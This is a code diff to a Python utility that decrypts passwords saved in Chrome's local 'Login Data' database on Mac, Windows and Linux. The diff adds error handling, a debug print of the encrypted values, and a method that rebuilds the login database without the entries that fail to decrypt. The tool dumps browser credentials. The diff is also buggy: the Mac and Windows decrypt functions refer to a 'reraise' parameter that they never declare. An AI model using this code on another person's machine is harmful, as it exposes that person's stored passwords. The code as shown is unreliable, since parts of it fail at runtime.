@@ -3,13 +3,14 @@
 """
 import json
 import os
+import os.path
 import platform
 import sqlite3
 import string
 import subprocess
 from getpass import getuser
 from importlib import import_module
-from os import unlink
+from os import unlink,rename
 from shutil import copy
 
 import secretstorage
@@ -45,9 +46,13 @@ class ChromeMac:
         initialization_vector = b' ' * 16
         enc_passwd = enc_passwd[3:]
         cipher = aes.new(self.key, aes.MODE_CBC, IV=initialization_vector)
-        decrypted = cipher.decrypt(enc_passwd)
-        return decrypted.strip().decode('utf8')
-
+        try:
+            decrypted = cipher.decrypt(enc_passwd)
+            return decrypted.strip().decode('utf8')
+        except BaseException as err:
+            if reraise:
+                raise
+            return("FAILED DECODE: "+str(err))
 
 class ChromeWin:
     """ Decryption class for chrome windows installation """
@@ -67,8 +72,14 @@ class ChromeWin:
     def decrypt_func(self, enc_passwd):
         """ Windows Decryption Function """
         win32crypt = import_module('win32crypt')
-        data = win32crypt.CryptUnprotectData(enc_passwd, None, None, None, 0)
-        return data[1].decode('utf8')
+        try:
+           data = win32crypt.CryptUnprotectData(enc_passwd, None, None, None, 0)
+           return data[1].decode('utf8')
+        except BaseException as err:
+            if reraise:
+                raise
+            return("FAILED DECODE: "+str(err))
+
 
 
 class ChromeLinux:
@@ -90,14 +101,19 @@ class ChromeLinux:
         self.key = kdf.PBKDF2(my_pass, salt, length, iterations)
         self.dbpath = f"/home/{getuser()}/.config/google-chrome/Default/"
 
-    def decrypt_func(self, enc_passwd):
+    def decrypt_func(self, enc_passwd, reraise = False):
         """ Linux Decryption Function """
         aes = import_module('Crypto.Cipher.AES')
         initialization_vector = b' ' * 16
         enc_passwd = enc_passwd[3:]
         cipher = aes.new(self.key, aes.MODE_CBC, IV=initialization_vector)
         decrypted = cipher.decrypt(enc_passwd)
-        return decrypted.strip().decode('utf8')
+        try:
+            return decrypted.strip().decode('utf8')
+        except BaseException as err:
+            if reraise:
+                raise
+            return("FAILED DECODE: "+str(err))
 
 
 class Chrome:
@@ -130,6 +146,7 @@ class Chrome:
             FROM logins; """)
         data = {'data': []}
         for result in cursor.fetchall():
+            print(result[2])
             _passwd = self.chrome_os.decrypt_func(result[2])
             passwd = ''.join(i for i in _passwd if i in string.printable)
             if result[1] or passwd:
@@ -144,6 +161,96 @@ class Chrome:
         if prettyprint:
             return json.dumps(data, indent=4)
         return data
+
+    def rewrite_passwords(self):
+        """ Write a new Login Data file in the current directory without garbled lines
+        """
+
+        # failsafe
+        if os.path.exists("Login Data"):
+            print ("Login Data exists. If you are running inside Chrome config directory, DON'T. Otherwise delete the file and rerun")
+            return
+
+        copy(self.chrome_os.dbpath + "Login Data", "Login Data Copy.db")
+        conn = sqlite3.connect("Login Data Copy.db")
+        new_conn = sqlite3.connect("Login Data.db")
+        new_cursor = new_conn.cursor()
+
+        password_param_index = -1
+
+        for line in conn.iterdump():
+            exec = True
+
+            #print(line)
+
+            if (line.find("CREATE TABLE logins") >= 0):
+                # determine the index of the password
+                password_param_index = 0
+                mangle_line = line
+
+                while (mangle_line.find(',')>=0) and (mangle_line.find(',')<mangle_line.find("password_value")):
+                    password_param_index += 1
+                    mangle_line = mangle_line[mangle_line.find(',')+1:]
+
+
+            if (line.find('INSERT INTO "logins"') >= 0) and (password_param_index >= 0):
+                # this line adds a line into logins, find the password, try to decrypt it
+                mangle_line = line
+
+                # remove all until the ( inclusive
+                mangle_line = mangle_line[mangle_line.find('(')+1:]
+
+                # process character by character
+                # when a comma is encountered outside a '' delineated string, increase current_index
+                # stop when the password_param_index is reached or the line is empty
+                current_index = 0
+                in_string = False
+                while current_index < password_param_index:
+                    # failsafe
+                    if len(mangle_line) == 0:
+                        break
+
+                    # process double '' inside a string for escaping, special case
+                    if in_string and (mangle_line[0:2] == "''"):
+                        mangle_line = mangle_line[2:]
+                        continue
+
+                    # process a comma
+                    if (not in_string) and (mangle_line[0] == ','):
+                        current_index += 1
+
+                    # process a single quote to enter or exit a string
+                    if mangle_line[0] == "'":
+                        in_string = not in_string
+
+                    mangle_line = mangle_line[1:]
+
+                if (len(mangle_line) == 0) or (mangle_line.find(',')<mangle_line.find("'")):
+                    print("Password value not found: "+line)
+                else:
+                    # retrieve password value
+                    mangle_line = mangle_line[mangle_line.find("'")+1:]
+                    mangle_line = mangle_line[:mangle_line.find("'")]
+                    password_value = bytes.fromhex(mangle_line)
+                    try:
+                        _passwd = self.chrome_os.decrypt_func(password_value, reraise = True)
+                    except BaseException:
+                        print("Failed and excluded: "+line)
+                        exec = False
+
+            if exec:
+                new_cursor.execute(line)
+            else:
+                print("Line skipped")
+
+
+        conn.close()
+        new_conn.close()
+        unlink("Login Data Copy.db")
+        rename("Login Data.db","Login Data")
+        print("New Login Data ready, use at your own risk")
+
+
 
 
 def main():
